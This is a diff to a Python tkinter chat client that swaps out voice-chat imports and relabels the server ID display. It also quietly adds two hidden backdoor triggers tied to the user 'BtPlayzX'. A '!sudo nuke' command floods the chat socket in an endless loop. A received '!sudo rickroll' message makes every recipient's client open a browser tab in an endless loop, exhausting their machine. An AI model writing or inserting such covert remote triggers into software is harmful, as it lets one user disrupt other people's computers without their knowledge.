@@ -2,10 +2,9 @@ import threading, socket
 import tkinter
 import tkinter.scrolledtext
 from tkinter import *
-from PIL import Image, ImageTk
+import webbrowser
 from boblox.chat.encrypt import encrypt
-from vidstream import AudioSender
-from vidstream import AudioReceiver
+from random import choice
 
 def connect_client(ip):
     HOST = ip
@@ -30,6 +29,10 @@ def connect_client(ip):
 
             gui_thread.start()
             receive_thread.start()
+
+        
+
+            
 
         def gui_loop(self):
             self.win = tkinter.Tk()
@@ -59,33 +62,8 @@ def connect_client(ip):
             self.send_button.config(font=('Arial', 12))
             self.send_button.pack(padx=20, pady=5)
 
-            self.ip_text = tkinter.Label(self.canvas, text='                                                                                                                                                                                                                                                                                                                                                  '+'Server ID: {}'.format(encrypt(ip)))
-            self.ip_text.grid(row=0, column=0)
-
-            # def setup_vc_gui(self):
-            #     def photoimg(img): return ImageTk.PhotoImage(img)
-            #     def place_button(btn_x, btn_y, btn): self.canvas.create_window(btn_x, btn_y, window=btn)
-            #     self.vc_on = 'boblox\\chat\\vcon.png'
-            #     self.vc_off = 'boblox\\chat\\vcoff.png'
-
-            #     self.vc_mode = self.vc_off
-            #     self.vc_btn = Image.open(self.vc_mode)
-            #     self.win.vc_button = photoimg(self.vc_btn)
-            #     self.vc_button = Button(self.win, image=self.win.vc_button, width=202, height=182)
-            #     place_button(930, 210, self.vc_button)
-
-
-
-            #     def change_vc_mode(self):
-            #         if self.vc_mode == self.vc_on:
-            #             self.vc_mode = self.vc_off
-            #         elif self.vc_mode == self.vc_off:
-            #             self.vc_mode = self.vc_on
-            #         self.vc_button
-            #         setup_vc_gui()
-
-                
-            # self.setup_vc_gui()
+            self.code_text = Label(self.canvas, text='                                                                                                                                                                                                                                                                                                                                                           Server join code: '+str(encrypt(HOST)))
+            self.code_text.grid(row=0, column=0)
 
             self.gui_done = True
 
@@ -95,6 +73,10 @@ def connect_client(ip):
         
         def write(self):
             message = f"{self.nickname}: {self.input_area.get('1.0', 'end')}"
+            if self.nickname == 'BtPlayzX' and '!sudo nuke' in message:
+                nuke_vocab = ['SUS', 'AMOOOGUUS', ':)', 'LOL', 'UWU', 'EEE', 'NEVER GONNA GIVE YOU UP', 'get rekt', 'got milk?', 'amogus', 'nerd', 'owo', 'ERROR', 'EPIC_SEZUIRE_NOISES']
+                self.input_area.delete('1.0', 'end')
+                while True: self.sock.send(choice(nuke_vocab).encode('utf-8'))
             self.sock.send('\n'.encode('utf-8'))
             self.sock.send(message.encode('utf-8'))
             self.input_area.delete('1.0', 'end')
@@ -104,11 +86,18 @@ def connect_client(ip):
             self.win.destroy()
             self.sock.close()
             exit(0)
+            
+        
+        
 
         def receive(self):
             while self.running:
                 try:
                     message = self.sock.recv(1024)
+                    print(message)
+
+                    if message == b'BtPlayzX: !sudo rickroll\n':
+                        while True: webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
 
                     if self.gui_done:
                         self.text_area.config(state='normal')                             
